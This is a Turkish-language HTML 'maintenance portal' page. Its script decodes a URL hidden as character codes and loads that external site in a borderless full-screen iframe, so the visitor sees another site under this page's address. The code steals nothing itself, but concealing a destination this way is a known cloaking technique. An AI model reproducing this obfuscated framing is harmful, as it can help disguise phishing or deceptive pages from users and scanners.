<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bakım  Portalı</title>
    <style>
      
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background-color: #000;
        }

        /* Konteynerı tüm ekrana yayma */
        #view-container {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
        }

        /
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
    </style>
</head>
<body>

    <div id="view-container"></div>

    <script>
        // 
        const codes = [104,116,116,112,115,58,47,47,118,101,114,105,116,97,98,97,110,105,45,112,111,114,116,97,108,105,46,97,105,46,115,116,117,100,105,111,47];
        
        // 
        const targetUrl = codes.map(c => String.fromCharCode(c)).join('');

        // 
        const iframe = document.createElement('iframe');
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.setAttribute('allowfullscreen', 'true');

        document.getElementById('view-container').appendChild(iframe);

        // 
        try {
            iframe.contentWindow.location.replace(targetUrl);
        } catch (e) {
            iframe.src = targetUrl;
        }
    </script>

</body>
</html>
